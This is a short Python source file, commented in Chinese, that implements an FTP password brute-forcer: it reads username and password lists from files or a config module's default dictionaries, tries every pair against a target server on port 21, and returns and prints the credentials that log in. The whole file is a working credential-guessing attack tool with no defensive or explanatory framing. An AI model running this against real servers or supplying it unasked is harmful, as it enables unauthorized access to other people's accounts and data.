import ftplib
import os
from config import *

def ftpCrack(ftp_server:str, username_file:str, password_file:str):
    userdict = dict()
    ftp_usernames = []
    password_list = []
    if username_file:
        with open(username_file) as f:
            ftp_usernames = [username.strip() for username in f.readlines()]
    if password_file:
        with open(password_file) as f:
            password_list = [password.strip() for password in f.readlines()]

    if not ftp_usernames:
        ftp_usernames = Userdict['ftp']
    if not password_list:
        password_list = Passwords

    # 定义ftp服务器信息
    ftp_port = 21

    # 遍历用户名列表和密码列表，进行暴力破解
    for username in ftp_usernames:
        for password in password_list:
            try:
                # 创建FTP对象并登录
                ftp = ftplib.FTP()
                ftp.connect(ftp_server, ftp_port)
                ftp.login(username, password)

                # 登录成功则打印成功信息
                print(f"[+] 登录成功：{username}@{ftp_server}:{ftp_port}，密码：{password}")
                userdict[username] = password
                ftp.quit()
                #exit(0)

            except Exception as e:
                # 登录失败则忽略异常，继续尝试下一条密码
                print(f"[-] 登录失败：{username}@{ftp_server}:{ftp_port}，密码：{password}")
                pass
    return userdict

   # print("[*] Password not found in the dictionary.")